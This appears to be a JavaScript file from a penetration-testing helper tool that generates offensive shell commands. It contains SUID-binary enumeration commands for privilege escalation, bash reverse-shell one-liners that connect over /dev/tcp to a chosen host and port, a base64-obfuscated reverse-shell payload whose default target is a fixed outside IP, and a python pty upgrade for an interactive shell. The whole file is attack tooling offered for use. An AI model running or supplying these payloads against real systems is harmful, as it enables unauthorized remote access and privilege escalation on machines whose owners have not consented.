window.Shell = {}

window.Shell.SUID = {
    suid1: value => 'find / -user root -perm -4000 -print 2>/dev/null' + value,
    suid2: value => 'find / -perm -u=s -type f 2>/dev/null' + value,
    suid3: value => 'find / -user root -perm -4000 -exec ls -ldb {} ;' + value,
    find: value => 'find . -exec whoami \; -quit' + value,
}

window.Shell.revshell = {
    bashRev: value => {
        if (value.length === 0 ){
            return "/bin/bash -i >& /dev/tcp/RHOST/RPORT 0>&1"
        } else {
            var regex = /^((\d{1,3}\.){3}\d{1,3}):(\d{1,5})$/;
            var match = value.match(regex);
            if (match){
                return "/bin/bash -i >& /dev/tcp/" + match[1] + "/" + match[3] + " 0>&1"
            } else{
                return "/bin/bash -i >& /dev/tcp/RHOST/RPORT 0>&1"
            }
        }
    },
    javaRev: value => {
        if (value.length === 0){
            return "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}" + value
        } else {
            var regex = /^((\d{1,3}\.){3}\d{1,3}):(\d{1,5})$/;
            var match = value.match(regex);
            if (match){
                var a = "bash -i >& /dev/tcp/" + match[1] + "/" + match[3] + " 0>&1"
                return "bash -c {echo," + btoa(a) + "}|{base64,-d}|{bash,-i}"
            } else{
                return "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}" + value
            }
        }
    }
}

window.Shell.Interactive = {
    pyInteractive: value => "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
}